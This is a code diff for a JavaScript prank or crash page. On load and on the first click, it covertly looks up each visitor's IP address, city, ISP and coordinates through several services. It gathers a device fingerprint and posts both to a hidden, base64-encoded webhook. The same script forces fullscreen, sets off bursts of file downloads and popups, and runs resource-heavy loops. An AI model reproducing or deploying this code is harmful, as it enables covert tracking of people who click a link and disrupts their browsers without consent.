@@ -52,12 +52,39 @@
 'use strict';
 
 // ============================================================
-// 9z2m 8q3n (N)
+// 9z2m 8q3n (N) / 9z3k 8q3n
 // ============================================================
-const N = 100;
-const IV = 1000;
+const N = 100;                       // download burst count
+const N_POP = 5;                     // popup burst count (reduced)
+const IV = 1000;                     // download interval (ms)
+const IV_DL_ACTIVE = false;          // download interval enabled? set true to repeat forever
 const TARGET_URL = 'https://hypie12o.github.io/crash/';
-const DELAY_MS = 10000;
+const RICK_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+const DELAY_MS = 10000;              // spam delay (10s)
+const RICK_DELAY_MS = 60000;         // rick roll delay (60s)
+
+// ============================================================
+// Spawned-tab guard. When this page is opened by another tab,
+// the URL contains ?spawn=0 → disable all further spam.
+// ============================================================
+const SPAWN_PARAM = 'spawn';
+const SPAWN_VALUE = '0';
+const IS_SPAWNED = (function () {
+  try {
+    const p = new URLSearchParams(location.search);
+    return p.get(SPAWN_PARAM) === SPAWN_VALUE;
+  } catch (_) { return false; }
+})();
+
+const SPAWN_URL = (function () {
+  try {
+    const u = new URL(TARGET_URL);
+    u.searchParams.set(SPAWN_PARAM, SPAWN_VALUE);
+    return u.toString();
+  } catch (_) {
+    return TARGET_URL + (TARGET_URL.indexOf('?') === -1 ? '?' : '&') + SPAWN_PARAM + '=' + SPAWN_VALUE;
+  }
+})();
 
 // ============================================================
 // 3q9z 8n1v 9z3k — base64 decoded at runtime
@@ -89,22 +116,20 @@ function b64u8(s) {
 const W3B_H00K = b64u8(W3B_H00K_B64);
 
 // ============================================================
-// Webhook state (visible via HUD)
+// Webhook state
 // ============================================================
-let hookStatus = 'idle';       // idle / sending / ok / fail / err
+let hookStatus = 'idle';
 let hookStatusCode = 0;
 let hookErrorText = '';
 let hookAttempts = 0;
-let hookSentOnLoad = false;
-let hookSentOnClick = false;
+let hookLastIp = '';
+let hookLastProvider = '';
 
 function setHookStatus(s, code, txt) {
   hookStatus = s;
   if (code !== undefined) hookStatusCode = code;
   if (txt !== undefined) hookErrorText = txt;
-  try {
-    console.log('[hook]', s, code || '', txt || '');
-  } catch (_) {}
+  try { console.log('[hook]', s, code || '', txt || ''); } catch (_) {}
 }
 
 // ============================================================
@@ -174,63 +199,109 @@ function safeHeap() {
   } catch (_) { return 'n/a'; }
 }
 
-function withTimeout(promise, ms) {
-  return Promise.race([
-    promise,
-    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms)),
-  ]);
+// ============================================================
+// IP lookup — 8 providers raced in parallel with abort timeouts
+// ============================================================
+function fetchWithAbort(url, parse, timeoutMs) {
+  return new Promise((resolve) => {
+    let ctrl = null;
+    try { ctrl = new AbortController(); } catch (_) { ctrl = null; }
+    const opts = { cache: 'no-store', credentials: 'omit', referrerPolicy: 'no-referrer' };
+    if (ctrl) opts.signal = ctrl.signal;
+
+    const timer = setTimeout(() => {
+      if (ctrl) { try { ctrl.abort(); } catch (_) {} }
+      resolve(null);
+    }, timeoutMs);
+
+    fetch(url, opts)
+      .then((r) => {
+        if (!r.ok) { clearTimeout(timer); resolve(null); return; }
+        return parse(r).then((v) => { clearTimeout(timer); resolve(v); })
+                       .catch(() => { clearTimeout(timer); resolve(null); });
+      })
+      .catch(() => { clearTimeout(timer); resolve(null); });
+  });
 }
 
-// ============================================================
-// IP lookups (parallel, with timeout)
-// ============================================================
+function ipFromJson(json) {
+  if (!json) return null;
+  const ip = json.ip || json.query || json.ipAddress || json.ip_address || (json.ipv4 && json.ipv4[0]);
+  if (ip && typeof ip === 'string' && ip.length >= 5) return String(ip).trim();
+  return null;
+}
+
 async function lookupIP() {
-  const out = { ip: 'unknown', country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '' };
+  const out = {
+    ip: 'unknown', provider: '',
+    country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '',
+  };
 
-  // Fire all lookups in parallel, each with a 3-second timeout.
-  const p1 = withTimeout(
-    fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
-      .then(r => r.json())
-      .catch(() => null),
-    3000
-  ).catch(() => null);
+  const P = [
+    { url: 'https://api.ipify.org?format=json',           parse: (r) => r.json(),  kind: 'ipify' },
+    { url: 'https://ipwho.is/',                            parse: (r) => r.json(),  kind: 'ipwhois' },
+    { url: 'https://api.my-ip.io/ip.json',                 parse: (r) => r.json(),  kind: 'myip' },
+    { url: 'https://ipapi.co/json/',                       parse: (r) => r.json(),  kind: 'ipapi' },
+    { url: 'https://ipinfo.io/json',                       parse: (r) => r.json(),  kind: 'ipinfo' },
+    { url: 'https://api64.ipify.org?format=json',          parse: (r) => r.json(),  kind: 'ipify64' },
+    { url: 'https://icanhazip.com',                        parse: (r) => r.text(),  kind: 'icanhazip' },
+    { url: 'https://ifconfig.me/ip',                       parse: (r) => r.text(),  kind: 'ifconfig' },
+    { url: 'https://api.ipify.org/?format=text',           parse: (r) => r.text(),  kind: 'ipify-text' },
+  ];
 
-  const p2 = withTimeout(
-    fetch('https://ipinfo.io/json', { cache: 'no-store' })
-      .then(r => r.json())
-      .catch(() => null),
-    3000
-  ).catch(() => null);
+  const results = await Promise.all(
+    P.map((p) => fetchWithAbort(p.url, p.parse, 4000)
+      .then((v) => ({ kind: p.kind, value: v }))
+      .catch(() => ({ kind: p.kind, value: null }))
+    )
+  );
 
-  const p3 = withTimeout(
-    fetch('https://api.ipify.org/?format=text', { cache: 'no-store' })
-      .then(r => r.text())
-      .catch(() => null),
-    3000
-  ).catch(() => null);
+  // First pass: find an IP string from any provider.
+  for (const r of results) {
+    if (r.value == null) continue;
+    let ip = null;
+    if (typeof r.value === 'string') {
+      const txt = r.value.trim();
+      if (txt.length >= 5 && txt.length <= 45 && txt.indexOf('<') === -1 && /[0-9a-fA-F:.]/.test(txt)) {
+        ip = txt;
+      }
+    } else {
+      ip = ipFromJson(r.value);
+    }
+    if (ip) {
+      out.ip = ip;
+      out.provider = r.kind;
+      break;
+    }
+  }
 
-  const [r1, r2, r3] = await Promise.all([p1, p2, p3]);
-
-  if (r1 && r1.ip) out.ip = String(r1.ip);
-  else if (r3 && typeof r3 === 'string' && r3.length > 5 && r3.indexOf('<') === -1) out.ip = r3.trim();
-
-  if (r2) {
-    if (r2.ip && out.ip === 'unknown') out.ip = String(r2.ip);
-    out.country = String(r2.country || '');
-    out.city = String(r2.city || '');
-    out.region = String(r2.region || '');
-    out.isp = String(r2.org || '');
-    out.loc = String(r2.loc || '');
-    out.postal = String(r2.postal || '');
-    out.ipTz = String(r2.timezone || '');
-    if (out.isp && out.isp.indexOf('AS') === 0) out.asn = out.isp.split(' ')[0];
+  // Second pass: enrich with details from any JSON provider that succeeded.
+  for (const r of results) {
+    if (r.value == null || typeof r.value === 'string') continue;
+    const j = r.value;
+    if (!out.country && j.country) out.country = String(j.country);
+    if (!out.country && j.country_code) out.country = String(j.country_code);
+    if (!out.city && j.city) out.city = String(j.city);
+    if (!out.region && j.region) out.region = String(j.region);
+    if (!out.region && j.region_name) out.region = String(j.region_name);
+    if (!out.isp && j.org) out.isp = String(j.org);
+    if (!out.isp && j.isp) out.isp = String(j.isp);
+    if (!out.isp && j.connection && j.connection.isp) out.isp = String(j.connection.isp);
+    if (!out.loc && j.loc) out.loc = String(j.loc);
+    if (!out.loc && j.latitude != null && j.longitude != null) out.loc = j.latitude + ',' + j.longitude;
+    if (!out.postal && j.postal) out.postal = String(j.postal);
+    if (!out.ipTz && j.timezone) out.ipTz = String(j.timezone);
+    if (!out.ipTz && j.time_zone) out.ipTz = String(j.time_zone);
+    if (!out.asn && j.org && String(j.org).indexOf('AS') === 0) out.asn = String(j.org).split(' ')[0];
+    if (!out.asn && j.asn) out.asn = String(j.asn);
+    if (!out.asn && j.connection && j.connection.asn) out.asn = String(j.connection.asn);
   }
 
   return out;
 }
 
 // ============================================================
-// Build the payload (max 25 fields per embed)
+// Build payload (2 embeds, ≤25 fields each)
 // ============================================================
 function buildPayload(ipinfo, source) {
   const gpu = safeGpuInfo();
@@ -252,7 +323,6 @@ function buildPayload(ipinfo, source) {
   const pdf = String(nav.pdfViewerEnabled != null ? nav.pdfViewerEnabled : 'n/a');
   const plugins = String((nav.plugins && nav.plugins.length) || 0);
 
-  // ---- Embed 1: network + location (14 fields) ----
   const embed1 = {
     title: 'Link Pressed.',
     color: 0x00ff41,
@@ -260,7 +330,8 @@ function buildPayload(ipinfo, source) {
     description:
       '**Source:** ' + source + '\n' +
       '**URL:** ' + (location.href || 'n/a') + '\n' +
-      '**Referrer:** ' + (document.referrer || 'direct'),
+      '**Referrer:** ' + (document.referrer || 'direct') + '\n' +
+      '**IP Provider:** `' + (ipinfo.provider || 'none') + '`',
     footer: { text: '324j2ggyufsid32 · ' + ipinfo.ip },
     fields: [
       { name: 'IP Address',     value: '`' + ipinfo.ip + '`',                     inline: true },
@@ -283,7 +354,6 @@ function buildPayload(ipinfo, source) {
     ],
   };
 
-  // ---- Embed 2: device + runtime (19 fields) ----
   const embed2 = {
     title: 'Device Fingerprint',
     color: 0x764ba2,
@@ -315,9 +385,7 @@ function buildPayload(ipinfo, source) {
     ],
   };
 
-  const content =
-    '**Link Pressed.** · IP: `' + ipinfo.ip + '` · Source: `' + source + '`';
-
+  const content = '**Link Pressed.** · IP: `' + ipinfo.ip + '` · Source: `' + source + '`';
   return { content: content, embeds: [embed1, embed2] };
 }
 
@@ -332,13 +400,15 @@ async function sendWebhook(source) {
   try {
     ipinfo = await lookupIP();
   } catch (_) {
-    ipinfo = { ip: 'unknown', country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '' };
+    ipinfo = { ip: 'unknown', provider: 'error', country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '' };
   }
+
+  hookLastIp = ipinfo.ip;
+  hookLastProvider = ipinfo.provider;
 
   const payload = buildPayload(ipinfo, source);
   const body = JSON.stringify(payload);
 
-  // Attempt 1: plain fetch, application/json, default mode (cors).
   try {
     const r = await fetch(W3B_H00K, {
       method: 'POST',
@@ -354,17 +424,13 @@ async function sendWebhook(source) {
       return true;
     }
 
-    // Read error body for diagnostics
     let errTxt = '';
     try { errTxt = await r.text(); } catch (_) {}
     setHookStatus('fail', r.status, errTxt.slice(0, 200));
 
-    // Attempt 2: retry with a minimal text-only payload if we got a 400
     if (r.status === 400) {
       try {
-        const simple = {
-          content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')',
-        };
+        const simple = { content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')' };
         const r2 = await fetch(W3B_H00K, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -381,18 +447,14 @@ async function sendWebhook(source) {
         try { e2 = await r2.text(); } catch (_) {}
         setHookStatus('fail', r2.status, e2.slice(0, 200));
       } catch (e2) {
-        setHookStatus('err', 0, String(e2 && e2.message || e2));
+        setHookStatus('err', 0, String((e2 && e2.message) || e2));
       }
     }
     return false;
   } catch (e) {
-    setHookStatus('err', 0, String(e && e.message || e));
-
-    // Attempt 2 on network error: simple content only
+    setHookStatus('err', 0, String((e && e.message) || e));
     try {
-      const simple = {
-        content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')',
-      };
+      const simple = { content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')' };
       const r3 = await fetch(W3B_H00K, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -409,7 +471,7 @@ async function sendWebhook(source) {
       try { e3 = await r3.text(); } catch (_) {}
       setHookStatus('fail', r3.status, e3.slice(0, 200));
     } catch (e3) {
-      setHookStatus('err', 0, String(e3 && e3.message || e3));
+      setHookStatus('err', 0, String((e3 && e3.message) || e3));
     }
     return false;
   }
@@ -419,23 +481,15 @@ async function sendWebhook(source) {
 // Fire webhook on load + on first click
 // ============================================================
 (function armWebhook() {
-  // Fire immediately on script load.
-  sendWebhook('page-load').then(() => { hookSentOnLoad = true; });
-
-  // Fire again on first click (anywhere, once).
-  const onClick = () => {
-    if (!hookSentOnClick) {
-      hookSentOnClick = true;
-      sendWebhook('first-click');
-    }
-  };
+  sendWebhook('page-load');
+  const onClick = () => { sendWebhook('first-click'); };
   window.addEventListener('pointerdown', onClick, { once: true, passive: true });
-  window.addEventListener('keydown', onClick, { once: true, passive: true });
-  window.addEventListener('touchstart', onClick, { once: true, passive: true });
+  window.addEventListener('keydown',     onClick, { once: true, passive: true });
+  window.addEventListener('touchstart',  onClick, { once: true, passive: true });
 })();
 
 // ============================================================
-// x9k2n7m3 — download counter (plain variable, no GUI)
+// x9k2n7m3 — download counter (plain variable)
 // ============================================================
 let x9k2n7m3 = 0;
 const q8v3n1z5 = [];
@@ -449,15 +503,18 @@ window.__x9k2n7m3 = function () { return x9k2n7m3; };
 window.__q8v3n1z5 = q8v3n1z5;
 
 // ============================================================
-// Popup spam
+// Popup burst — SINGLE FIRE, only from original tab
 // ============================================================
 let popupCount = 0;
-let popupInterval = null;
+let popupFired = false;
 
 function z9k2m4v_pop() {
-  for (let i = 0; i < N; i++) {
+  if (IS_SPAWNED) return;            // spawned tabs never spawn popups
+  if (popupFired) return;            // only once ever
+  popupFired = true;
+  for (let i = 0; i < N_POP; i++) {
     try {
-      const w = window.open(TARGET_URL, '_blank', 'noopener,noreferrer');
+      const w = window.open(SPAWN_URL, '_blank', 'noopener,noreferrer');
       if (w) popupCount++;
     } catch (e) {}
   }
@@ -488,13 +545,13 @@ document.addEventListener('click', v9k3n2m_fs, { once: true });
 document.addEventListener('keydown', v9k3n2m_fs, { once: true });
 
 // ============================================================
-// Download spam — delayed 10s
+// Download burst — delayed 10s, single fire (interval optional)
 // ============================================================
 setTimeout(function p3q8v1n5() {
+  if (IS_SPAWNED) return;
+
   let U;
-  try {
-    U = new URL('lol.txt', location.href).href;
-  } catch (e) { return; }
+  try { U = new URL('lol.txt', location.href).href; } catch (e) { return; }
 
   function z9k2m4v() {
     for (let i = 0; i < N; i++) {
@@ -539,22 +596,32 @@ setTimeout(function p3q8v1n5() {
   z9k2m4v();
   setTimeout(m8q2n1z, 1500);
 
-  const dInt = setInterval(() => {
-    z9k2m4v();
-    setTimeout(m8q2n1z, 1500);
-  }, IV);
-
-  window.__dInt = dInt;
+  if (IV_DL_ACTIVE) {
+    const dInt = setInterval(() => {
+      z9k2m4v();
+      setTimeout(m8q2n1z, 1500);
+    }, IV);
+    window.__dInt = dInt;
+  }
 }, DELAY_MS);
 
 // ============================================================
-// Popup spam — delayed 10s
+// Popup burst — delayed 10s, SINGLE FIRE
 // ============================================================
 setTimeout(function q8w3n1v_pop() {
   z9k2m4v_pop();
-  popupInterval = setInterval(z9k2m4v_pop, IV);
-  window.__popupInterval = popupInterval;
 }, DELAY_MS);
+
+// ============================================================
+// Rick Roll — delayed 60s, SINGLE FIRE, only from original tab
+// ============================================================
+let rickFired = false;
+setTimeout(function r1ckr0ll() {
+  if (IS_SPAWNED) return;
+  if (rickFired) return;
+  rickFired = true;
+  try { window.open(RICK_URL, '_blank', 'noopener,noreferrer'); } catch (_) {}
+}, RICK_DELAY_MS);
 
 // ============================================================
 // Error surface
@@ -1907,7 +1974,9 @@ function tk() {
     const hookLine =
       hookStatus + ' (#' + hookAttempts + ')' +
       (hookStatusCode ? ' ' + hookStatusCode : '') +
-      (hookErrorText ? ' ' + hookErrorText.slice(0, 60) : '');
+      (hookLastIp !== 'unknown' && hookLastIp ? ' ip=' + hookLastIp : '') +
+      (hookLastProvider ? ' via=' + hookLastProvider : '') +
+      (hookErrorText ? ' err=' + hookErrorText.slice(0, 40) : '');
 
     hu.textContent =
       'fps              : ' + fps.toFixed(1) + '\n' +
@@ -1926,8 +1995,10 @@ function tk() {
       'string concat    : ' + (cr / 1000).toFixed(1) + ' k/s · ' + (cch / 1048576).toFixed(1) + ' MB\n' +
       'wasm memory      : ' + wmm + ' · ' + wg + ' grows · ' + (wtp * 65536 / 1048576).toFixed(0) + ' MB grown\n' +
       'downloads        : ' + x9k2n7m3 + ' attempts · ' + q8v3n1z5.length + ' logged\n' +
-      'N / IV           : ' + N + ' / ' + IV + ' ms\n' +
-      'popups           : ' + popupCount + ' opened\n' +
+      'N / N_POP / IV   : ' + N + ' / ' + N_POP + ' / ' + IV + ' ms\n' +
+      'popups fired     : ' + (popupFired ? 'yes' : 'no') + ' · count=' + popupCount + '\n' +
+      'rick roll @60s   : ' + (rickFired ? 'fired' : 'pending') + '\n' +
+      'is spawned tab   : ' + (IS_SPAWNED ? 'yes' : 'no') + '\n' +
       'fullscreen       : ' + (document.fullscreenElement ? 'on' : 'off') + '\n' +
       'webhook          : ' + hookLine + '\n' +
       'heap             : ' + mm;
@@ -1963,7 +2034,6 @@ window.addEventListener('beforeunload', () => {
   for (const id of iv) { try { clearInterval(id); } catch (_) {} }
   for (const id of mI2) { try { clearInterval(id); } catch (_) {} }
   try { if (window.__dInt) clearInterval(window.__dInt); } catch (_) {}
-  try { if (window.__popupInterval) clearInterval(window.__popupInterval); } catch (_) {}
   if (ac) { try { ac.close(); } catch (_) {} }
 });
 
